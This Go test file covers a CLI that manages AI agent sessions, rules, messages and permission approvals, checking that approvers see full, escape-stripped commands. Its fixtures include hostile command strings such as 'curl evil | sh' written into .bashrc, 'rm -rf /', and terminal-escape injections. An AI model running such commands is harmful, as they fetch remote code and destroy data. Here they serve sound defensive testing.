package cli

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/abdallah/session-hub/internal/api"
	"github.com/abdallah/session-hub/internal/client"
)

// fakeActions is a sessionhub with sessions, rules, messages, and permission
// requests.
type fakeActions struct {
	sessions []api.Session
	rules    []api.Instruction
	addErr   error
	sent     []api.MessagesIn
	results  []api.MessageResult
	// states is what GetMessage returns for a message, one per read; the
	// last one repeats.
	states    map[string][]api.Message
	decided   []string // "id decision reason"
	decideErr error
	inbox     api.Inbox
}

func (f *fakeActions) ListSessions(_ context.Context, live bool, machine string) ([]api.Session, error) {
	var out []api.Session
	for _, s := range f.sessions {
		if machine == "" || s.Machine == machine {
			out = append(out, s)
		}
	}
	return out, nil
}

func (f *fakeActions) GetSession(_ context.Context, prefix string) (api.SessionDetail, error) {
	var hits []api.Session
	for _, s := range f.sessions {
		if strings.HasPrefix(s.ID, prefix) {
			hits = append(hits, s)
		}
	}
	switch len(hits) {
	case 0:
		return api.SessionDetail{}, &client.StatusError{Status: 404, Message: "not found: session " + prefix}
	case 1:
		return api.SessionDetail{Session: hits[0]}, nil
	}
	return api.SessionDetail{}, &client.StatusError{Status: 409, Message: fmt.Sprintf("id prefix %q matches %d sessions", prefix, len(hits))}
}

func (f *fakeActions) Health(context.Context) error { return nil }

func (f *fakeActions) Instructions(context.Context) (api.InstructionList, error) {
	return api.InstructionList{Instructions: f.rules, Version: "v"}, nil
}

func (f *fakeActions) AddInstruction(_ context.Context, text string) (api.Instruction, error) {
	if f.addErr != nil {
		return api.Instruction{}, f.addErr
	}
	r := api.Instruction{ID: int64(len(f.rules) + 1), Text: text, CreatedBy: "tower"}
	f.rules = append(f.rules, r)
	return r, nil
}

func (f *fakeActions) DeleteInstruction(_ context.Context, id int64) error {
	for i, r := range f.rules {
		if r.ID == id {
			f.rules = append(f.rules[:i], f.rules[i+1:]...)
			return nil
		}
	}
	return &client.StatusError{Status: 404, Message: fmt.Sprintf("not found: rule %d", id)}
}

func (f *fakeActions) SendMessages(_ context.Context, in api.MessagesIn) (api.MessagesOut, error) {
	f.sent = append(f.sent, in)
	return api.MessagesOut{Results: f.results}, nil
}

func (f *fakeActions) GetMessage(_ context.Context, id string) (api.Message, error) {
	list := f.states[id]
	m := list[0]
	if len(list) > 1 {
		f.states[id] = list[1:]
	}
	return m, nil
}

func (f *fakeActions) DecidePermission(_ context.Context, id string, in api.DecisionIn) (api.PermissionRequest, error) {
	if f.decideErr != nil {
		return api.PermissionRequest{}, f.decideErr
	}
	// Like the server: no allow for a cut input.
	for _, it := range f.inbox.Items {
		if p := it.Permission; p != nil && p.ID == id && p.Truncated && in.Decision == api.DecisionAllow {
			return api.PermissionRequest{}, &client.StatusError{Status: 409, Message: "the input was cut; allow it in the terminal"}
		}
	}
	f.decided = append(f.decided, strings.TrimSpace(id+" "+in.Decision+" "+in.Reason))
	return api.PermissionRequest{ID: id, State: api.PermissionDecided, Decision: in.Decision}, nil
}

func (f *fakeActions) Inbox(context.Context) (api.Inbox, error) { return f.inbox, nil }
func (f *fakeActions) DismissInbox(context.Context, string, time.Time) error {
	return errors.New("not used")
}
func (f *fakeActions) SnoozeInbox(context.Context, string, time.Time, time.Time) error {
	return errors.New("not used")
}

func actionsEnv(f *fakeActions) (*env, *bytes.Buffer, *time.Time) {
	var out bytes.Buffer
	clock := now
	e := &env{api: f, inbox: f, actions: f, out: &out, width: func() int { return 100 },
		now: func() time.Time { return clock }, pause: func(d time.Duration) { clock = clock.Add(d) }}
	return e, &out, &clock
}

func TestRules(t *testing.T) {
	f := &fakeActions{}
	e, out, _ := actionsEnv(f)
	ctx := context.Background()
	if err := e.rules(ctx, nil); err != nil || out.String() != "no standing rules\n" {
		t.Errorf("empty ls: %q %v", out.String(), err)
	}
	out.Reset()
	if err := e.rules(ctx, []string{"add", "Never push to main."}); err != nil || out.String() != "added rule 1\n" {
		t.Errorf("add: %q %v", out.String(), err)
	}
	if err := e.rules(ctx, []string{"add", "Write in \x1b[31mBritish English."}); err != nil {
		t.Errorf("second add: %v", err)
	}
	out.Reset()
	if err := e.rules(ctx, []string{"ls"}); err != nil {
		t.Fatal(err)
	}
	want := "1  Never push to main.  (tower)\n2  Write in [31mBritish English.  (tower)\n"
	if out.String() != want {
		t.Errorf("ls:\n got %q\nwant %q", out.String(), want)
	}
	out.Reset()
	if err := e.rules(ctx, []string{"rm", "1"}); err != nil || out.String() != "removed rule 1\n" {
		t.Errorf("rm: %q %v", out.String(), err)
	}
	if err := e.rules(ctx, []string{"rm", "9"}); err == nil || !strings.Contains(err.Error(), "rule 9") {
		t.Errorf("rm unknown: %v", err)
	}
	for _, bad := range [][]string{{"rm"}, {"rm", "x"}, {"add"}, {"add", "a", "b"}, {"frob"}} {
		if err := e.rules(ctx, bad); err == nil || !strings.Contains(err.Error(), "usage") {
			t.Errorf("%q: %v, want usage", bad, err)
		}
	}
	f.addErr = &client.StatusError{Status: 409, Message: "full: remove a rule first"}
	if err := e.rules(ctx, []string{"add", "x"}); err == nil || !strings.Contains(err.Error(), "remove a rule first") {
		t.Errorf("full: %v", err)
	}
}

func sendFixture() *fakeActions {
	return &fakeActions{sessions: []api.Session{
		{ID: "aaaaaaaa-1111", Title: "fix login", Machine: "tower", Status: api.StatusLive, Controllable: true, Messageable: true},
		{ID: "bbbbbbbb-2222", Title: "docs", Machine: "tower", Status: api.StatusLive, Controllable: true, Messageable: true},
		{ID: "cccccccc-3333", Title: "hooks only", Machine: "tower", Status: api.StatusLive},
		{ID: "dddddddd-4444", Title: "on bluebox", Machine: "bluebox", Status: api.StatusLive, Controllable: true, Messageable: true},
		{ID: "aaaabbbb-5555", Title: "twin", Machine: "bluebox", Status: api.StatusLive, Controllable: true, Messageable: true},
	}}
}

func TestSendWaitsForDelivery(t *testing.T) {
	f := sendFixture()
	f.results = []api.MessageResult{
		{SessionID: "aaaaaaaa-1111", ID: "msg_a", State: api.MessageQueued},
		{SessionID: "bbbbbbbb-2222", ID: "msg_b", State: api.MessageQueued},
	}
	f.states = map[string][]api.Message{
		"msg_a": {{State: api.MessageQueued}, {State: api.MessageDelivered}},
		"msg_b": {{State: api.MessageQueued, Detail: "the agent is working"}},
	}
	e, out, clock := actionsEnv(f)
	err := e.send(context.Background(), []string{"aaaaaaaa", "bbbb", "-m", "Please rebase."})
	if len(f.sent) != 1 || strings.Join(f.sent[0].SessionIDs, ",") != "aaaaaaaa-1111,bbbbbbbb-2222" || f.sent[0].Text != "Please rebase." {
		t.Fatalf("sent %+v", f.sent)
	}
	want := "aaaaaaaa  fix login  queued\n" +
		"bbbbbbbb  docs  queued\n" +
		"aaaaaaaa  delivered\n" +
		"bbbbbbbb  not delivered yet: the agent is working; sessionhub keeps trying for 10 minutes\n"
	if out.String() != want {
		t.Errorf("output:\n%s\nwant:\n%s", out.String(), want)
	}
	if err != nil {
		t.Errorf("err %v, want nil: nothing was refused", err)
	}
	if waited := clock.Sub(now); waited < sendWait || waited > sendWait+2*sendPoll {
		t.Errorf("waited %s, want about %s", waited, sendWait)
	}
}

func TestSendRefusedAndMachine(t *testing.T) {
	f := sendFixture()
	f.results = []api.MessageResult{{SessionID: "dddddddd-4444", ID: "msg_d", State: api.MessageQueued},
		{SessionID: "aaaabbbb-5555", State: api.MessageRefused, Detail: "the session is not in herdr"}}
	f.states = map[string][]api.Message{"msg_d": {{State: api.MessageDelivered}}}
	e, out, _ := actionsEnv(f)
	err := e.send(context.Background(), []string{"--machine", "bluebox", "-m", "hi"})
	if strings.Join(f.sent[0].SessionIDs, ",") != "dddddddd-4444,aaaabbbb-5555" {
		t.Errorf("--machine targets %v", f.sent[0].SessionIDs)
	}
	if !strings.Contains(out.String(), "aaaabbbb  twin  refused: the session is not in herdr") {
		t.Errorf("output %q", out.String())
	}
	var ee *ExitError
	if !errors.As(err, &ee) || ee.Code != 1 {
		t.Errorf("a refused target: err %v, want exit 1", err)
	}
	// --machine skips sessions that cannot take a message.
	e, _, _ = actionsEnv(f)
	f.sent = nil
	e.send(context.Background(), []string{"--machine", "tower", "-m", "hi"})
	if got := strings.Join(f.sent[0].SessionIDs, ","); got != "aaaaaaaa-1111,bbbbbbbb-2222" {
		t.Errorf("tower targets %s, want the controllable ones", got)
	}
	// A session outside herdr whose mod polls takes messages too.
	f.sessions[2].Messageable = true
	e, _, _ = actionsEnv(f)
	f.sent = nil
	e.send(context.Background(), []string{"--machine", "tower", "-m", "hi"})
	if got := strings.Join(f.sent[0].SessionIDs, ","); got != "aaaaaaaa-1111,bbbbbbbb-2222,cccccccc-3333" {
		t.Errorf("tower targets %s, want the messageable ones", got)
	}
}

func TestSendExpiredExitsOne(t *testing.T) {
	f := sendFixture()
	f.results = []api.MessageResult{{SessionID: "aaaaaaaa-1111", ID: "msg_a", State: api.MessageQueued}}
	f.states = map[string][]api.Message{"msg_a": {{State: api.MessageExpired, Detail: "not delivered in 10 minutes"}}}
	e, out, _ := actionsEnv(f)
	err := e.send(context.Background(), []string{"aaaaaaaa", "-m", "hi"})
	if !strings.Contains(out.String(), "aaaaaaaa  expired: not delivered in 10 minutes\n") {
		t.Errorf("output %q", out.String())
	}
	var ee *ExitError
	if !errors.As(err, &ee) || ee.Code != 1 {
		t.Errorf("an expired message: err %v, want exit 1", err)
	}
}

func TestSendUsage(t *testing.T) {
	f := sendFixture()
	e, _, _ := actionsEnv(f)
	ctx := context.Background()
	for name, args := range map[string][]string{
		"no text":    {"aaaaaaaa"},
		"no target":  {"-m", "hi"},
		"both":       {"aaaaaaaa", "--machine", "tower", "-m", "hi"},
		"empty text": {"aaaaaaaa", "-m", "  "},
		"dangling":   {"aaaaaaaa", "-m"},
	} {
		if err := e.send(ctx, args); err == nil || !strings.Contains(err.Error(), "usage") {
			t.Errorf("%s: %v, want usage", name, err)
		}
	}
	if err := e.send(ctx, []string{"aaaa", "-m", "hi"}); err == nil || !strings.Contains(err.Error(), "matches 2 sessions") {
		t.Errorf("ambiguous prefix: %v", err)
	}
	if err := e.send(ctx, []string{"--machine", "nope", "-m", "hi"}); err == nil || !strings.Contains(err.Error(), "no live session") {
		t.Errorf("empty machine: %v", err)
	}
	if len(f.sent) != 0 {
		t.Errorf("a refused command sent %d messages", len(f.sent))
	}
}

func permissionInbox() api.Inbox {
	p := &api.PermissionRequest{ID: "pr_AAAAAAAAAAAAAAAAAAAAAA", ToolName: "Bash", ToolInput: json.RawMessage(`{"command":"git push"}`),
		State: api.PermissionOpen}
	in := inboxFixture()
	in.Items[0].Permission = p
	return in
}

// answering makes e a terminal session whose person types answer.
func answering(e *env, answer string) {
	e.in = strings.NewReader(answer)
	e.stdinTerminal = func() bool { return true }
}

func TestApproveAndDeny(t *testing.T) {
	f := &fakeActions{inbox: permissionInbox()}
	e, out, _ := actionsEnv(f)
	ctx := context.Background()
	answering(e, "y\n")
	if err := e.approve(ctx, []string{"aaaa"}); err != nil {
		t.Fatal(err)
	}
	want := "aaaaaaaa  fix login asks to use Bash:\n    git push\nrequest pr_AAAAAAAAAAAAAAAAAAAAAA\n" +
		"Allow this once? [y/N] allowed once: Bash git push (aaaaaaaa  fix login)\n"
	if out.String() != want {
		t.Errorf("approve output:\n got %q\nwant %q", out.String(), want)
	}
	out.Reset()
	if err := e.deny(ctx, []string{"pr_AAAAAAAAAAAAAAAAAAAAAA", "use make clean"}); err != nil {
		t.Fatal(err)
	}
	if out.String() != "denied: pr_AAAAAAAAAAAAAAAAAAAAAA\n" {
		t.Errorf("deny by request ID %q", out.String())
	}
	wantDec := []string{"pr_AAAAAAAAAAAAAAAAAAAAAA allow", "pr_AAAAAAAAAAAAAAAAAAAAAA deny use make clean"}
	if strings.Join(f.decided, "|") != strings.Join(wantDec, "|") {
		t.Errorf("decisions %q", f.decided)
	}
	err := e.approve(ctx, []string{"bbbb"})
	if err == nil || !strings.Contains(err.Error(), "approve: bbbbbbbb has no open permission request") ||
		!strings.Contains(err.Error(), "sessionhub inbox --json") {
		t.Errorf("waiting item: %v", err)
	}
	for _, bad := range [][]string{{}, {"a", "b"}, {"--yes"}} {
		if err := e.approve(ctx, bad); err == nil || !strings.Contains(err.Error(), "usage") {
			t.Errorf("approve %q: %v", bad, err)
		}
	}
	if err := e.deny(ctx, []string{"aaaa", "a", "b"}); err == nil || !strings.Contains(err.Error(), "usage") {
		t.Errorf("deny with two reasons: %v", err)
	}
	f.decideErr = &client.StatusError{Status: 409, Message: "conflict: request pr_x is already decided"}
	err = e.approve(ctx, []string{"aaaa", "--yes"})
	if err == nil || !strings.HasPrefix(err.Error(), "approve: ") || !strings.Contains(err.Error(), "already decided") {
		t.Errorf("second decision: %v", err)
	}
	if err := e.deny(ctx, []string{"--yes", "aaaa"}); err == nil || !strings.HasPrefix(err.Error(), "deny: ") {
		t.Errorf("deny error prefix: %v", err)
	}
}

// TestApproveAsks pins the question sessionhub approve and sessionhub deny ask before
// they answer by session prefix.
func TestApproveAsks(t *testing.T) {
	ctx := context.Background()
	for name, c := range map[string]struct {
		args     []string
		deny     bool
		terminal bool
		answer   string
		decided  string // "" means nothing was sent
		errHas   string
		outHas   string
	}{
		"n aborts":        {args: []string{"aaaa"}, terminal: true, answer: "n\n", errHas: "approve: cancelled; nothing was sent", outHas: "Allow this once? [y/N] "},
		"empty aborts":    {args: []string{"aaaa"}, terminal: true, answer: "\n", errHas: "cancelled"},
		"eof aborts":      {args: []string{"aaaa"}, terminal: true, answer: "", errHas: "cancelled"},
		"yes allows":      {args: []string{"aaaa"}, terminal: true, answer: " YES \n", decided: "pr_AAAAAAAAAAAAAAAAAAAAAA allow"},
		"deny asks":       {args: []string{"aaaa", "no"}, deny: true, terminal: true, answer: "y\n", decided: "pr_AAAAAAAAAAAAAAAAAAAAAA deny no", outHas: "Deny this request? [y/N] "},
		"deny n aborts":   {args: []string{"aaaa"}, deny: true, terminal: true, answer: "n\n", errHas: "deny: cancelled"},
		"--yes skips":     {args: []string{"--yes", "aaaa"}, decided: "pr_AAAAAAAAAAAAAAAAAAAAAA allow"},
		"-y skips":        {args: []string{"aaaa", "-y"}, decided: "pr_AAAAAAAAAAAAAAAAAAAAAA allow"},
		"no terminal":     {args: []string{"aaaa"}, errHas: "approve: stdin is not a terminal", outHas: "git push"},
		"request ID":      {args: []string{"pr_AAAAAAAAAAAAAAAAAAAAAA"}, decided: "pr_AAAAAAAAAAAAAAAAAAAAAA allow"},
		"ambiguous":       {args: []string{"cccc"}, terminal: true, answer: "y\n", errHas: "matches 2 inbox items"},
		"not in inbox":    {args: []string{"zzzz"}, terminal: true, answer: "y\n", errHas: "not in the inbox"},
		"deny no tty":     {args: []string{"aaaa"}, deny: true, errHas: "deny: stdin is not a terminal"},
		"deny --yes":      {args: []string{"aaaa", "why", "--yes"}, deny: true, decided: "pr_AAAAAAAAAAAAAAAAAAAAAA deny why"},
		"request ID deny": {args: []string{"pr_AAAAAAAAAAAAAAAAAAAAAA"}, deny: true, decided: "pr_AAAAAAAAAAAAAAAAAAAAAA deny"},
	} {
		f := &fakeActions{inbox: permissionInbox()}
		e, out, _ := actionsEnv(f)
		if c.terminal {
			answering(e, c.answer)
		}
		run := e.approve
		if c.deny {
			run = e.deny
		}
		err := run(ctx, c.args)
		if got := strings.Join(f.decided, "|"); got != c.decided {
			t.Errorf("%s: decided %q, want %q", name, got, c.decided)
		}
		switch {
		case c.errHas == "" && err != nil:
			t.Errorf("%s: %v", name, err)
		case c.errHas != "" && (err == nil || !strings.Contains(err.Error(), c.errHas)):
			t.Errorf("%s: err %v, want %q", name, err, c.errHas)
		}
		if !strings.Contains(out.String(), c.outHas) {
			t.Errorf("%s: output %q lacks %q", name, out.String(), c.outHas)
		}
		if strings.HasPrefix(c.args[0], "pr_") && strings.Contains(out.String(), "[y/N]") {
			t.Errorf("%s: asked for a request ID", name)
		}
	}
}

// jsonString is s as a JSON string.
func jsonString(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

// TestApproveShowsFullInput: the approver reads the whole command, or the
// whole JSON of any other tool, and a note when the input was cut.
func TestApproveShowsFullInput(t *testing.T) {
	long := "echo " + strings.Repeat("x", 3000) + " && rm -rf \x1b[31m/tmp/y"
	content := strings.Repeat("é", 3500)
	for name, c := range map[string]struct {
		tool      string
		input     string
		truncated bool
		has       []string
		lacks     []string
	}{
		"long bash": {tool: "Bash", input: `{"command":` + jsonString(long) + `}`,
			has: []string{strings.Repeat("x", 3000) + " && rm -rf [31m/tmp/y\n"}, lacks: []string{"\x1b"}},
		"write": {tool: "Write", input: `{"file_path":"/home/u/.bashrc","content":"curl evil | sh"}`,
			has: []string{"Write:\n    {\"file_path\":\"/home/u/.bashrc\",\"content\":\"curl evil | sh\"}\n"}},
		"two-line bash": {tool: "Bash", input: `{"command":` + jsonString("echo ok\ncurl evil | sh\r\n\tsudo  rm\x1b[0m -rf /") + `}`,
			has:   []string{"Bash:\n    echo ok\n    curl evil | sh\n        sudo rm[0m -rf /\nrequest "},
			lacks: []string{"echo ok curl", "\r", "\x1b"}},
		"long write": {tool: "Write", input: `{"file_path":"/a","content":"` + content + `"}`,
			has: []string{`{"file_path":"/a","content":"` + content + "\"}\n"}, lacks: []string{"…"}},
	} {
		in := permissionInbox()
		in.Items[0].Permission.ToolName = c.tool
		in.Items[0].Permission.ToolInput = json.RawMessage(c.input)
		in.Items[0].Permission.Truncated = c.truncated
		f := &fakeActions{inbox: in}
		e, out, _ := actionsEnv(f)
		answering(e, "n\n")
		e.approve(context.Background(), []string{"aaaa"})
		for _, h := range c.has {
			if !strings.Contains(out.String(), h) {
				t.Errorf("%s: output lacks %.80q…:\n%.300s", name, h, out.String())
			}
		}
		for _, l := range c.lacks {
			if strings.Contains(out.String(), l) {
				t.Errorf("%s: output has %q", name, l)
			}
		}
		if strings.Contains(out.String(), "was cut") {
			t.Errorf("%s: cut note on a whole input", name)
		}
		if !strings.Contains(out.String(), "request pr_AAAAAAAAAAAAAAAAAAAAAA\n") {
			t.Errorf("%s: no request ID", name)
		}
		if len(f.decided) != 0 {
			t.Errorf("%s: sent %q after n", name, f.decided)
		}
	}
}

// TestApproveRefusesCutInput: sessionhub approve never allows a request whose
// input was cut, by prefix, with --yes, or by request ID; sessionhub deny still
// denies it.
func TestApproveRefusesCutInput(t *testing.T) {
	const pr = "pr_AAAAAAAAAAAAAAAAAAAAAA"
	ctx := context.Background()
	for name, c := range map[string]struct {
		args    []string
		deny    bool
		inbox   bool // the request is in the inbox
		decided string
		errHas  string
	}{
		"prefix":         {args: []string{"aaaa"}, inbox: true, errHas: "approve: the input was cut; allow it in the terminal"},
		"prefix --yes":   {args: []string{"aaaa", "--yes"}, inbox: true, errHas: "the input was cut; allow it in the terminal"},
		"request ID":     {args: []string{pr}, inbox: true, errHas: "the input was cut; allow it in the terminal"},
		"deny prefix":    {args: []string{"aaaa", "too long to check"}, deny: true, inbox: true, decided: pr + " deny too long to check"},
		"deny --yes":     {args: []string{"aaaa", "--yes"}, deny: true, inbox: true, decided: pr + " deny"},
		"deny ID":        {args: []string{pr}, deny: true, decided: pr + " deny"},
		"deny ID absent": {args: []string{pr}, deny: true, inbox: false, decided: pr + " deny"},
	} {
		in := permissionInbox()
		p := in.Items[0].Permission
		p.ToolName, p.ToolInput, p.Truncated = "Write", json.RawMessage(jsonString(`{"file_path":"/a","content":"abc…`)), true
		if !c.inbox {
			in.Items[0].Permission = nil
		}
		f := &fakeActions{inbox: in}
		e, out, _ := actionsEnv(f)
		answering(e, "y\n")
		run := e.approve
		if c.deny {
			run = e.deny
		}
		err := run(ctx, c.args)
		if got := strings.Join(f.decided, "|"); got != c.decided {
			t.Errorf("%s: decided %q, want %q", name, got, c.decided)
		}
		switch {
		case c.errHas == "" && err != nil:
			t.Errorf("%s: %v", name, err)
		case c.errHas != "" && (err == nil || !strings.Contains(err.Error(), c.errHas)):
			t.Errorf("%s: err %v, want %q", name, err, c.errHas)
		}
		if strings.HasPrefix(c.args[0], "aaaa") && c.errHas != "" && !strings.Contains(out.String(), "The input was cut") {
			t.Errorf("%s: no cut note in %q", name, out.String())
		}
		if strings.HasPrefix(c.args[0], "aaaa") && !strings.Contains(out.String(), `{"file_path":"/a","content":"abc…`) {
			t.Errorf("%s: the cut input is not shown: %q", name, out.String())
		}
	}
}

func TestInboxLineShowsRequest(t *testing.T) {
	in := permissionInbox()
	line := inboxLine(in.Items[0], now, 200)
	if !strings.Contains(line, "asks to use Bash: git push") || strings.Contains(line, "Asked which token") {
		t.Errorf("line %q", line)
	}
	if strings.Contains(line, "(cut)") {
		t.Errorf("an uncut request says cut: %q", line)
	}
	p := in.Items[0].Permission
	p.ToolName, p.ToolInput, p.Truncated = "Write", json.RawMessage(jsonString(`{"file_path":"/a/b.go","content":"`+strings.Repeat("x", 300)+"…")), true
	line = inboxLine(in.Items[0], now, 80)
	if !strings.HasSuffix(line, "… (cut)") || !strings.Contains(line, `asks to use Write: {"file_path":"/a`) || len([]rune(line)) != 80 {
		t.Errorf("cut request line %q (%d runes)", line, len([]rune(line)))
	}
}

func TestServerErrorsAreCleanedAndCapped(t *testing.T) {
	f := &fakeActions{addErr: &client.StatusError{Status: 500, Message: "bad \x1b[31mred " + strings.Repeat("x", 1000)}}
	e, _, _ := actionsEnv(f)
	err := e.rules(context.Background(), []string{"add", "x"})
	if err == nil || strings.Contains(err.Error(), "\x1b") || len(err.Error()) > 400 {
		t.Errorf("error %q (%d bytes), want no escape and a capped length", err, len(err.Error()))
	}
}

func TestApproverLines(t *testing.T) {
	for in, want := range map[string]string{
		"git push":                      "    git push",
		"echo ok\ncurl evil | sh":       "    echo ok\n    curl evil | sh",
		"a\r\n  b\rc":                   "    a\n      b\n    c",
		"x\n\n\ty‮ z":                   "    x\n\n        y z",
		"if x; then\n  \x1b[2Jrm -rf ~": "    if x; then\n      [2Jrm -rf ~",
	} {
		if got := approverLines(in); got != want {
			t.Errorf("approverLines(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestInboxLineTinyWidth(t *testing.T) {
	in := permissionInbox()
	in.Items[0].Permission.Truncated = true
	for _, w := range []int{1, 3, 6, 7} {
		if line := inboxLine(in.Items[0], now, w); !strings.HasSuffix(line, " (cut)") || len([]rune(line)) > 7+w {
			t.Errorf("width %d: %q", w, line)
		}
	}
}

// A blocked item shows the question its mod reported, over the waiting_on
// items and the recap; a permission request still wins.
func TestInboxLineShowsBlockedOn(t *testing.T) {
	s := api.Session{ID: "aaaaaaaa-1111", Title: "t", Machine: "tower", Status: api.StatusBlocked, Recap: "Asked which token.",
		BlockedOn: "Question: Which\x1b[2J token?"}
	it := api.InboxItem{Group: api.InboxBlocked, Since: now.Add(-time.Minute), WaitingOn: []string{"w"}, Session: s}
	if line := inboxLine(it, now, 200); !strings.HasSuffix(line, "  Question: Which[2J token?") {
		t.Errorf("blocked line %q", line)
	}
	it.Group = api.InboxWaiting
	if line := inboxLine(it, now, 200); !strings.HasSuffix(line, "  w") {
		t.Errorf("a waiting item shows blocked_on: %q", line)
	}
	in := permissionInbox()
	in.Items[0].Session.BlockedOn = "Question: x?"
	if line := inboxLine(in.Items[0], now, 200); !strings.Contains(line, "  Question: x? · asks to use Bash: git push") {
		t.Errorf("permission line %q", line)
	}
}
